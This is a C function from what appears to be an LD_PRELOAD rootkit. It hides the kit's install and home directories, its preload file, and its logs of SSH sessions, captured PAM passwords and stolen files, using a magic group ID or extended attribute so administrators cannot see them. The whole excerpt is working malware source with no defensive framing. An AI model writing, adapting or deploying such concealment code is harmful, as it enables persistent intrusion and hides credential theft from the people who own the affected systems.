/* bc should point to an already populated & unxor'd bdvcfg_t.
 * all kit paths are hidden with newid & if enabled, your oldid ass is hidden. */
void hidebdvpaths(const bdvcfg_t *bc, id_t newid, id_t oldid, char *oldattr){
    const char *const bdvpaths[] = {
        #ifdef OUTGOING_SSH_LOGGING
         bc->sshlogs,
        #endif
        #ifdef ENABLE_STEAL
         bc->interestdir,
        #endif
        #ifdef PAM_AUTH_LOGGING
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir,
         bc->homedir
    };

    doiapath(bc->preloadpath, 0);
#ifdef USE_MAGIC_ATTR
    attrmodif(bc->preloadpath, CSETXATTR);
#else
    chownpath(bc->preloadpath, newid);
#endif
    while(!doiapath(bc->preloadpath, 1));

    for(size_t i=0; i<sizeofarr(bdvpaths); i++){
#ifdef USE_MAGIC_ATTR
        attrmodif(bdvpaths[i], CSETXATTR);
#else
        chownpath(bdvpaths[i], newid);
#endif
    }

#ifdef HIDE_MY_ASS
    hidemyass(bc);
#endif
}